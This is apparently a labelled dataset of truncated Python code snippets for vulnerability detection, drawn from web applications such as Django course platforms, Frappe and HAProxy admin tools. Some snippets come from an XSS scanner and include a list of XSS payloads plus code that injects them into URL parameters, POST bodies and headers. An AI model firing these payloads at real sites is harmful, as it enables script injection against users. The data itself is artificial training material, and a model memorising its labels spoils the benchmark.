_get_workflows(user): return[{ 'name': workflow.name, 'owner': workflow.owner.username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for", "label": 0}, {"snippet_id": 2934, "code": " xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%", "label": 0}, {"snippet_id": 25097, "code": "'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course", "label": 0}, {"snippet_id": 47828, "code": "(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) user: Profile=Profile.objects.get(pk=pid) user.displayName=displayname user.dect=dect user.notes=notes", "label": 1}, {"snippet_id": 13175, "code": ".create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change", "label": 0}, {"snippet_id": 42285, "code": "() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields", "label": 0}, {"snippet_id": 22906, "code": "/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r", "label": 1}, {"snippet_id": 11275, "code": "*kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses", "label": 0}, {"snippet_id": 4824, "code": " _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"", "label": 0}, {"snippet_id": 7001, "code": " url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'),", "label": 0}, {"snippet_id": 48454, "code": "=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id)) return response def write_db_reservation_action(request: HttpRequest): \"\"\" This function is used to submit the reservation \"\"\" u", "label": 0}, {"snippet_id": 4792, "code": ", 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes", "label": 0}, {"snippet_id": 50343, "code": " to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) return '\"\"' def mode_input(self, request): \"\"\" This is called by render_POST when the client is", "label": 0}, {"snippet_id": 50215, "code": ".databuffer[csessid]=dataentries def client_disconnect(self, csessid): \"\"\" Disconnect session with given csessid. Args: csessid(int): Session id. \"\"\" if csessid in self.requests: self.requests[csessid].finish(", "label": 0}, {"snippet_id": 46439, "code": " 'layout': layout }) dashboard_doc1=dashboard_doc.doc.get() dashboard_doc.name=dashboard_doc1.name=collection['label'] dashboard_doc.description=dashboard_doc1.description=collection['description'] dashboard_doc", "label": 0}, {"snippet_id": 48605, "code": "=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) sr.save() print(request.POST) print(sr.notes) return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"])) +\"&srid=\" +str(sr.id))", "label": 0}, {"snippet_id": 41938, "code": "\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t", "label": 0}, {"snippet_id": 23193, "code": "<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$", "label": 0}, {"snippet_id": 13839, "code": "/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$", "label": 0}, {"snippet_id": 23057, "code": "]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading", "label": 0}, {"snippet_id": 6003, "code": "\"eduID SAML frontend IdP\", long_description=README, classifiers=[ ], keywords='eduID SAML', author='Fredrik Thulin', author_email='fredrik@thulin.net', license='BSD', packages=['eduid_idp',], package_dir=", "label": 0}, {"snippet_id": 16491, "code": ".urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url", "label": 0}, {"snippet_id": 31367, "code": " -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\t\t \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections", "label": 0}, {"snippet_id": 46517, "code": "'absoluteUrl']=reverse('search:index_m') +'?collection=%s' % collection.id massaged_collection['isOwner']=collection.doc.get().can_write(request.user) collections.append(massaged_collection) return JsonResponse", "label": 0}, {"snippet_id": 43642, "code": "._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta", "label": 0}, {"snippet_id": 20686, "code": "(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$'", "label": 0}, {"snippet_id": 53289, "code": " submission=Submission(request.user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting", "label": 0}, {"snippet_id": 43322, "code": "(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t", "label": 0}, {"snippet_id": 43923, "code": ".file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter", "label": 0}, {"snippet_id": 45042, "code": "=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id", "label": 0}, {"snippet_id": 51282, "code": "='admin/config/settings.html' admin.site.unregister([Config]) admin.site.register([Config], ConfigAdmin) @admin.register(Account) class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display", "label": 0}, {"snippet_id": 47097, "code": "'), version_id=_('Revision'), json=_('JSON'), ) column_formatters=dict( version_id=lambda v, c, m, p: m.version_id-1, json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format( json.dumps(m.json, indent=2", "label": 1}, {"snippet_id": 7349, "code": ": template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$", "label": 0}, {"snippet_id": 21324, "code": ", url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P", "label": 1}, {"snippet_id": 20159, "code": ".default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example,", "label": 0}, {"snippet_id": 19637, "code": ".start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file,", "label": 0}, {"snippet_id": 728, "code": "://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1:", "label": 1}, {"snippet_id": 22039, "code": "+=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status", "label": 0}, {"snippet_id": 36344, "code": " shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc", "label": 0}, {"snippet_id": 48155, "code": " and cropped it. The resulting PK is \" +str(m.pk)) def action_add_single_media(request: HttpRequest): try: headline=request.POST[\"headline\"] category=request.POST[\"category\"] text=request.POST[\"text\"] file", "label": 0}, {"snippet_id": 30476, "code": "/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s %s %s\" %(serv, date, date1, rows, grep_act, grep)] \t\tsyslog_server=sql.get_setting('syslog_server') \t \tif waf==\"1\": \t\tlocal_path_logs='/var/log", "label": 0}, {"snippet_id": 6764, "code": " the service. \"\"\" return self.config.get(self.section, 'base_url') @property def default_eppn_scope(self): \"\"\" The scope to append to any unscoped eduPersonPrincipalName attributes found on users in the", "label": 0}, {"snippet_id": 49082, "code": ".current_columns) @property def priority(self): if self.is_ordered(): return self.current_columns.index(self.column_id) +1 def is_ordered(self): return self.column_id in self.current_columns def is_reverse(self)", "label": 0}, {"snippet_id": 30594, "code": " %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if form.getvalue('viewlogs') is not None: \tviewlog", "label": 0}, {"snippet_id": 53099, "code": "(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow']) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc", "label": 0}, {"snippet_id": 4044, "code": " not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url", "label": 0}, {"snippet_id": 54115, "code": ",post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck) print(\"[*]Test was finished at:{}\\n[*]Duration:{} seconds\\n\".format(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti))) print(\"=", "label": 0}, {"snippet_id": 50621, "code": "(*args, **kwargs) def get_client_session(self): \"\"\" Get the Client browser session(used for auto-login based on browser session) Returns: csession(ClientSession): This is a django-specific internal representation", "label": 0}, {"snippet_id": 53767, "code": " parser.add_argument('--region', type=str, required=True, help='The default application region') args=parser.parse_args() write_eb_config(args.dest, application_name=args.name, default_region=args.region", "label": 0}, {"snippet_id": 22994, "code": "/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard", "label": 0}, {"snippet_id": 54636, "code": " queryset class ArticleDetail(DetailView, FormMixin): \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002 \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002 \"\"\" model=Article context_object_name='article' template_name='details.html' form_class=CommentForm def", "label": 0}, {"snippet_id": 39857, "code": "'.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable", "label": 0}, {"snippet_id": 20137, "code": " if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running", "label": 0}, {"snippet_id": 7479, "code": "'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/", "label": 0}, {"snippet_id": 9917, "code": ": urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\")", "label": 0}, {"snippet_id": 23036, "code": ".grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 23647, "code": " test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure", "label": 0}, {"snippet_id": 41298, "code": " route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by", "label": 0}, {"snippet_id": 3146, "code": " xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload)", "label": 0}, {"snippet_id": 48654, "code": " HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\") if request.POST.get(\"notes\"): r.notes=request.POST[\"notes\"] if request.POST.get(\"contact\"): r.responsiblePerson=str(request.POST[\"contact\"", "label": 1}, {"snippet_id": 32194, "code": " import SocketServer import argparse import codecs import os import re import socket import sys import threading import time import webbrowser from xml.etree import ElementTree THIS_DIR=os.path.realpath", "label": 0}, {"snippet_id": 40888, "code": " True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\"", "label": 0}, {"snippet_id": 8022, "code": "<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$", "label": 0}, {"snippet_id": 24238, "code": " \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure", "label": 0}, {"snippet_id": 4007, "code": "', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url", "label": 0}, {"snippet_id": 19688, "code": " from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite", "label": 0}, {"snippet_id": 28808, "code": "=SSHClient() \tssh.load_system_host_keys() \tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \ttry: \t\tif ssh_enable==1: \t\t\tk=paramiko.RSAKey.from_private_key_file(ssh_key_name) \t\t\tssh.connect(hostname", "label": 0}, {"snippet_id": 33545, "code": " \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: ", "label": 0}, {"snippet_id": 3340, "code": "(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body", "label": 0}, {"snippet_id": 21561, "code": "[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 51841, "code": "%(levelname)-8s -%(filename)-20s:%(lineno)-4s -' '%(funcName)20s() -%(message)s', }, 'color':{ '()': 'colorlog.ColoredFormatter', 'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s -' '%(message)s', ", "label": 0}, {"snippet_id": 42235, "code": " key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns", "label": 0}, {"snippet_id": 3741, "code": " return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 7108, "code": ".password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url", "label": 0}, {"snippet_id": 10957, "code": ".verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring", "label": 0}, {"snippet_id": 24533, "code": " bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers", "label": 0}, {"snippet_id": 1958, "code": ".update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers)", "label": 0}, {"snippet_id": 30716, "code": " column -s, -t' %(enable, backend, haproxy_sock) \t \tif form.getvalue('save')==\"on\": \t\tsave_command='echo \"show servers state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) \t\tcommand=[ cmd,", "label": 0}, {"snippet_id": 5291, "code": ", 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label'", "label": 0}, {"snippet_id": 49484, "code": ".lookups() ] elif self.model_field.choices: values=[ SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices ] elif type(self.model_field)==BooleanField", "label": 0}, {"snippet_id": 13482, "code": "', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect", "label": 0}, {"snippet_id": 29284, "code": ".cfg\" \terror=\"\" \t \ttry: \t\tos.system(\"dos2unix \"+cfg) \texcept OSError: \t\treturn 'Please install dos2unix' \t\tpass \t \tif kwargs.get(\"keepalived\")==1: \t\tif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo", "label": 0}, {"snippet_id": 23204, "code": "\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 37477, "code": ".category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict", "label": 1}, {"snippet_id": 47717, "code": "(pw1: str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False if pw1.isupper(): return False if pw1.islower(): return False return True def recreate_form(reason: str): return redirect", "label": 0}, {"snippet_id": 29367, "code": " sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands.extend(open_port_firewalld(cfg)) \t \terror +=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t", "label": 0}, {"snippet_id": 31160, "code": " script) \t if form.getvalue('haproxyaddserv'): \tfunct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood')) \t if form.getvalue('installwaf'): \tfunct.waf_install(form.getvalue", "label": 0}, {"snippet_id": 16721, "code": "<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 1}, {"snippet_id": 20655, "code": ".change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r", "label": 0}, {"snippet_id": 48637, "code": "(createdByUser=u).count(): r=GroupReservation() r.createdByUser=u r.ready=False r.open=True r.pickupDate=datetime.datetime.now() else: return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations", "label": 0}, {"snippet_id": 39170, "code": "=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self", "label": 0}, {"snippet_id": 15889, "code": "(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url", "label": 0}, {"snippet_id": 41784, "code": ") is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get", "label": 0}, {"snippet_id": 16403, "code": "', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon", "label": 0}, {"snippet_id": 26953, "code": "=post_params) else: r=requests.post(furl, data=post_params) if DEBUG==1: print post_params with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) if r.content.find(xss", "label": 0}, {"snippet_id": 25146, "code": ".parser import pytz import vat_moss.errors import vat_moss.id from django import forms from django.contrib import messages from django.core.exceptions import ValidationError from django.utils.safestring", "label": 0}, {"snippet_id": 9493, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]", "label": 0}, {"snippet_id": 51077, "code": "', 'args') form=MyPeriodicTaskForm save_as=True @staticmethod def name_safe(obj): return mark_safe(obj.name) @staticmethod def last_run(obj): return obj.last_run_at @staticmethod def runs(obj): return obj", "label": 0}, {"snippet_id": 15628, "code": "/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE", "label": 0}, {"snippet_id": 45105, "code": "': job_id})) def list_editor_coordinators(request): coordinators=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/list_editor_coordinators", "label": 0}, {"snippet_id": 9958, "code": " 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404", "label": 0}, {"snippet_id": 39568, "code": ".fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any", "label": 0}, {"snippet_id": 2792, "code": "(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact", "label": 0}, {"snippet_id": 21507, "code": "+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading", "label": 0}, {"snippet_id": 46899, "code": " CommentMixin: async def add_comment(self, user_id, content, ref_id=0): obj=await Comment.create(github_id=user_id, post_id=self.id, ref_id=ref_id) redis=await create_pool(RedisSettings.from_url(REDIS_URL)) await", "label": 0}, {"snippet_id": 48485, "code": "=request.GET[\"redirect\"] if \"payload\" not in request.GET: return HttpResponseRedirect(\"/admin?error=No%20id%20provided\") current_reservation=GroupReservation.objects.get(id=int(request.GET[\"payload\"]))", "label": 0}, {"snippet_id": 41907, "code": "\t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value", "label": 0}, {"snippet_id": 40735, "code": " df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc", "label": 0}, {"snippet_id": 9414, "code": "<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 16530, "code": "\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',", "label": 0}, {"snippet_id": 22395, "code": " name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx", "label": 0}, {"snippet_id": 30122, "code": "' |awk '{ print $2 }' |awk -F'/' '{ print $1 }'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('showif'): \tcommands=[\"sudo ip link|grep 'UP' | awk '{print $2}' |awk -F':' '{print $1}'\"", "label": 0}, {"snippet_id": 54300, "code": " global timeout timeout=ttk.Combobox(main, values=range(1,61)) timeout.current(14) global user_agent user_agent=ttk.Combobox(main, values=ua) user_agent.current(1) global payload payload=ttk.Combobox(main,", "label": 0}, {"snippet_id": 28908, "code": "(serv, cfg, **kwargs): \timport sql \tconfig_path=\"/etc/keepalived/keepalived.conf\" if kwargs.get(\"keepalived\") else sql.get_setting('haproxy_config_path')\t \tssh=ssh_connect(serv) \ttry: \t\tsftp=ssh.open_sftp(", "label": 0}, {"snippet_id": 50434, "code": " reply until data is available. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) dataentries=self.databuffer.get(csessid,[", "label": 0}, {"snippet_id": 3711, "code": "(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain')", "label": 0}, {"snippet_id": 15877, "code": " self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode(", "label": 0}, {"snippet_id": 1744, "code": " vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*", "label": 0}, {"snippet_id": 23214, "code": " name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(", "label": 0}, {"snippet_id": 34288, "code": "\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing", "label": 0}, 